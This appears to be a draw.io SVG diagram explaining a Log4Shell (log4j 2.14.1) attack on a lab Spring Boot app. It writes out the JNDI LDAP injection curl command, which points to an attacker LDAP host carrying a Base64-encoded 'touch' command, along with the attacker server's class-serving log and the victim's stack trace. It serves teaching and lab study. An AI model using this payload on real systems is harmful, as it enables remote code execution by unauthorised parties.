<?xml version="1.0" encoding="UTF-8"?>
<!-- Do not edit this file with editors other than diagrams.net -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" style="background-color: rgb(255, 255, 255);" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="1230px" height="1313px" viewBox="-0.5 -0.5 1230 1313" content="&lt;mxfile host=&quot;app.diagrams.net&quot; modified=&quot;2021-12-22T15:35:36.775Z&quot; agent=&quot;5.0 (Windows)&quot; etag=&quot;j57k17dRrqj4hW_Q-QYn&quot; version=&quot;16.0.3&quot; type=&quot;device&quot;&gt;&lt;diagram id=&quot;7uBxj0XR9k4HUgkae3Xs&quot; name=&quot;Page-1&quot;&gt;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&lt;/diagram&gt;&lt;/mxfile&gt;"><defs/><g><rect x="671" y="0" width="549" height="840" rx="82.35" ry="82.35" fill="rgb(255, 255, 255)" stroke="rgb(0, 0, 0)" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe flex-start; justify-content: unsafe center; width: 547px; height: 1px; padding-top: 7px; margin-left: 672px;"><div style="box-sizing: border-box; font-size: 0px; text-align: center;" data-drawio-colors="color: rgb(0, 0, 0); "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: normal; overflow-wrap: normal;"><div style="font-size: 17px"><p><b><font style="font-size: 17px"><span style="background-color: transparent">victim webapp</span></font></b> (<font style="font-size: 17px"><span style="background-color: transparent"><b>victim:8080</b>)<br /></span></font></p><p align="left"><font style="font-size: 14px"><span style="background-color: transparent">spring-boot-starter-web:2.6.1<br />   <strike>spring-boot-starter-logging</strike></span></font></p><p align="left"><font style="font-size: 14px"><span style="background-color: transparent">spring-boot-starter-log4j2:2.6.1<br />   log4j-*:2.14.1</span></font></p></div><p style="font-size: 14px"><font style="font-size: 14px"><span style="background-color: transparent"></span></font></p><p><span style="background-color: transparent"></span></p></div></div></div></foreignObject><text x="946" y="19" fill="rgb(0, 0, 0)" font-family="Helvetica" font-size="12px" text-anchor="middle">victim webapp (victim:8080)...</text></switch></g><rect x="0" y="560" width="324" height="210" rx="31.5" ry="31.5" fill="rgb(255, 255, 255)" stroke="rgb(0, 0, 0)" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe flex-start; justify-content: unsafe center; width: 322px; height: 1px; padding-top: 567px; margin-left: 1px;"><div style="box-sizing: border-box; font-size: 0px; text-align: center;" data-drawio-colors="color: rgb(0, 0, 0); "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: normal; overflow-wrap: normal;"><div style="font-size: 17px"><p><b><font style="font-size: 17px"><span style="background-color: transparent">attacker modified LDAP server<br /></span></font></b></p><b><font style="font-size: 17px"><br /></font></b></div><p style="font-size: 17px"><b><font style="font-size: 17px"><span style="background-color: transparent"></span></font></b></p><p style="font-size: 17px"><b><font style="font-size: 17px"><span style="background-color: transparent"></span></font></b></p></div></div></div></foreignObject><text x="162" y="579" fill="rgb(0, 0, 0)" font-family="Helvetica" font-size="12px" text-anchor="middle">attacker modified LDAP server...</text></switch></g><path d="M 76 230 L 643.63 230" fill="none" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 648.88 230 L 641.88 233.5 L 643.63 230 L 641.88 226.5 Z" fill="rgb(0, 0, 0)" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="all"/><rect x="66" y="200" width="530" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 1px; height: 1px; padding-top: 210px; margin-left: 68px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: nowrap;">curl -s victim:8080 -H 'X-Api-Version:${jndi:ldap://attacker-ldap:1389/&lt;command&gt;}'</div></div></div></foreignObject><text x="68" y="214" fill="#000000" font-family="Helvetica" font-size="14px">curl -s victim:8080 -H 'X-Api-Version:${jndi:ldap://attacker-ldap:1389/&lt;comm...</text></switch></g><rect x="66" y="240" width="80" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 1px; height: 1px; padding-top: 250px; margin-left: 68px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: nowrap;">HTTP GET</div></div></div></foreignObject><text x="68" y="254" fill="#000000" font-family="Helvetica" font-size="14px">HTTP GET</text></switch></g><ellipse cx="81" cy="175" rx="15" ry="15" fill="#000000" stroke="rgb(0, 0, 0)" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 28px; height: 1px; padding-top: 175px; margin-left: 67px;"><div style="box-sizing: border-box; font-size: 0px; text-align: center;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; overflow-wrap: normal;"><font color="#FFFFFF">1</font></div></div></div></foreignObject><text x="81" y="179" fill="#000000" font-family="Helvetica" font-size="14px" text-anchor="middle" font-weight="bold">1</text></switch></g><rect x="735" y="198" width="260" height="60" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 258px; height: 1px; padding-top: 228px; margin-left: 737px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: normal; overflow-wrap: normal;"><p><font face="Helvetica"><span style="background-color: transparent"><u>MainController.class</u><br /></span>logger.info(...)<span style="background-color: transparent"></span></font></p></div></div></div></foreignObject><text x="737" y="232" fill="#000000" font-family="Helvetica" font-size="14px">MainController.class...</text></switch></g><ellipse cx="710" cy="228" rx="15" ry="15" fill="#000000" stroke="rgb(0, 0, 0)" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 28px; height: 1px; padding-top: 228px; margin-left: 696px;"><div style="box-sizing: border-box; font-size: 0px; text-align: center;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; overflow-wrap: normal;"><font color="#FFFFFF">2</font></div></div></div></foreignObject><text x="710" y="232" fill="#000000" font-family="Helvetica" font-size="14px" text-anchor="middle" font-weight="bold">2</text></switch></g><rect x="520" y="852" width="709" height="460" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 707px; height: 1px; padding-top: 859px; margin-left: 522px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: normal; overflow-wrap: normal;"><br />WARN Error looking up JNDI resource [ldap://attacker-ldap:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9pd29ya2VkCg==]. <br />javax.naming.NamingException: problem generating object using object factory<br />   remaining name '"Basic/Command/Base64/dG91Y2ggL3RtcC9pd29ya2VkCg=="'<br />at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092)<br />at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)<br />at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)<br />at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)<br />at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)<br />at javax.naming.InitialContext.lookup(InitialContext.java:417)<br />at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)<br />...<br />at org.apache.logging.log4j.spi.AbstractLogger.info(AbstractLogger.java:1320)<br />at fr.christophetd.log4shell.vulnerableapp.MainController.index(MainController.java:18)<br />...<br />at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898)<br />at javax.servlet.http.HttpServlet.service(HttpServlet.java:655)<br />...<br />   at java.lang.Thread.run(Thread.java:748)<br />Caused by: java.lang.ClassCastException: Exploitt9L2pa0wmf cannot be cast to javax.naming.spi.ObjectFactory<br />   at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)<br />   at javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:189)<br />   at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085)<br />   ... 88 more</div></div></div></foreignObject><text x="522" y="873" fill="#000000" font-family="Helvetica" font-size="14px">WARN Error looking up JNDI resource [ldap://attacker-ldap:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9pd...</text></switch></g><path d="M 656 584 L 336.37 584" fill="none" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 331.12 584 L 338.12 580.5 L 336.37 584 L 338.12 587.5 Z" fill="rgb(0, 0, 0)" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="all"/><path d="M 800 355 Q 730 355 665 367.5 Q 600 380 580 420 Q 560 460 595 505 Q 630 550 679.47 566.71" fill="none" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 684.44 568.39 L 676.69 569.47 L 679.47 566.71 L 678.93 562.84 Z" fill="rgb(0, 0, 0)" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="all"/><ellipse cx="635" cy="435" rx="15" ry="15" fill="#000000" stroke="rgb(0, 0, 0)" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 28px; height: 1px; padding-top: 435px; margin-left: 621px;"><div style="box-sizing: border-box; font-size: 0px; text-align: center;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; overflow-wrap: normal;"><font color="#FFFFFF">3</font></div></div></div></foreignObject><text x="635" y="439" fill="#000000" font-family="Helvetica" font-size="14px" text-anchor="middle" font-weight="bold">3</text></switch></g><rect x="589" y="461.5" width="90" height="30" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 88px; height: 1px; padding-top: 477px; margin-left: 591px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: normal; overflow-wrap: normal;">lookup JNDI</div></div></div></foreignObject><text x="591" y="481" fill="#000000" font-family="Helvetica" font-size="14px">lookup JNDI</text></switch></g><rect x="14" y="650" width="490" height="70" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 488px; height: 1px; padding-top: 657px; margin-left: 16px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: normal; overflow-wrap: normal;">[+] New HTTP Request From /172.21.0.3:60502  /Exploitt9L2pa0wmf.class<br />[+] Receive ClassRequest: Exploitt9L2pa0wmf.class<br />[+] Response Code: 200</div></div></div></foreignObject><text x="16" y="671" fill="#000000" font-family="Helvetica" font-size="14px">[+] New HTTP Request From /172.21.0.3:60502  /Exploitt9L2pa0wmf.class...</text></switch></g><path d="M 338 740 L 649.63 740" fill="none" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 654.88 740 L 647.88 743.5 L 649.63 740 L 647.88 736.5 Z" fill="rgb(0, 0, 0)" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="all"/><rect x="373" y="756" width="240" height="30" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 238px; height: 1px; padding-top: 763px; margin-left: 375px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: normal; overflow-wrap: normal;">Object sérialisé : Exploitt9L2pa0wmf</div></div></div></foreignObject><text x="375" y="777" fill="#000000" font-family="Helvetica" font-size="14px">Object sérialisé : Exploitt9L2pa0w...</text></switch></g><rect x="735" y="720" width="415" height="40" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 413px; height: 1px; padding-top: 740px; margin-left: 737px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: normal; overflow-wrap: normal;">Application decodes the response and triggers the payload</div></div></div></foreignObject><text x="737" y="744" fill="#000000" font-family="Helvetica" font-size="14px">Application decodes the response and triggers the payload</text></switch></g><path d="M 751.67 781.67 L 751.67 770 L 760 778.33 L 768.33 770 L 768.33 781.67 L 780 781.67 L 771.67 790 L 780 798.33 L 768.33 798.33 L 768.33 810 L 760 801.67 L 751.67 810 L 751.67 798.33 L 740 798.33 L 748.33 790 L 740 781.67 Z" fill="#ff0000" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="all"/><rect x="386" y="542" width="210" height="30" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 208px; height: 1px; padding-top: 557px; margin-left: 388px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: normal; overflow-wrap: normal;">server makes a request via JNDI</div></div></div></foreignObject><text x="388" y="561" fill="#000000" font-family="Helvetica" font-size="14px">server makes a request via JNDI</text></switch></g><ellipse cx="355" cy="557" rx="15" ry="15" fill="#000000" stroke="rgb(0, 0, 0)" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 28px; height: 1px; padding-top: 557px; margin-left: 341px;"><div style="box-sizing: border-box; font-size: 0px; text-align: center;" data-drawio-colors="color: #FFFFFF; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(255, 255, 255); line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; overflow-wrap: normal;">4</div></div></div></foreignObject><text x="355" y="561" fill="#FFFFFF" font-family="Helvetica" font-size="14px" text-anchor="middle" font-weight="bold">4</text></switch></g><rect x="66" y="285" width="604" height="50" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 602px; height: 1px; padding-top: 292px; margin-left: 68px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: normal; overflow-wrap: normal;"><div>command :</div><div><em>jndi:ldap://attacker-ldap:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9pd29ya2VkCg==</em></div></div></div></div></foreignObject><text x="68" y="306" fill="#000000" font-family="Helvetica" font-size="14px">command :...</text></switch></g><rect x="800" y="777.5" width="134" height="25" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 132px; height: 1px; padding-top: 785px; margin-left: 802px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: all; white-space: normal; overflow-wrap: normal;">touch /tmp/iworked</div></div></div></foreignObject><text x="802" y="799" fill="#000000" font-family="Helvetica" font-size="14px">touch /tmp/iworked</text></switch></g><ellipse cx="700.5" cy="741" rx="15" ry="15" fill="#000000" stroke="rgb(0, 0, 0)" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 28px; height: 1px; padding-top: 741px; margin-left: 687px;"><div style="box-sizing: border-box; font-size: 0px; text-align: center;" data-drawio-colors="color: #FFFFFF; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(255, 255, 255); line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; overflow-wrap: normal;">5</div></div></div></foreignObject><text x="701" y="745" fill="#FFFFFF" font-family="Helvetica" font-size="14px" text-anchor="middle" font-weight="bold">5</text></switch></g><image x="685" y="324.5" width="520" height="325" xlink:href="https://docs.oracle.com/javase/jndi/tutorial/figures/jndi/getStarted/jndiarch.jpg" preserveAspectRatio="none"/><path d="M 326.37 362 L 353.63 362" fill="none" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="none"/><path d="M 321.12 362 L 328.12 358.5 L 326.37 362 L 328.12 365.5 Z" fill="rgb(0, 0, 0)" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="none"/><path d="M 358.88 362 L 351.88 365.5 L 353.63 362 L 351.88 358.5 Z" fill="rgb(0, 0, 0)" stroke="rgb(0, 0, 0)" stroke-miterlimit="10" pointer-events="none"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 242px; height: 1px; padding-top: 355px; margin-left: 72px;"><div style="box-sizing: border-box; font-size: 0px; text-align: left;" data-drawio-colors="color: #000000; "><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: rgb(0, 0, 0); line-height: 1.2; pointer-events: none; white-space: normal; overflow-wrap: normal;">dG91Y2ggL3RtcC9pd29ya2VkCg==</div></div></div></foreignObject><text x="72" y="369" fill="#000000" 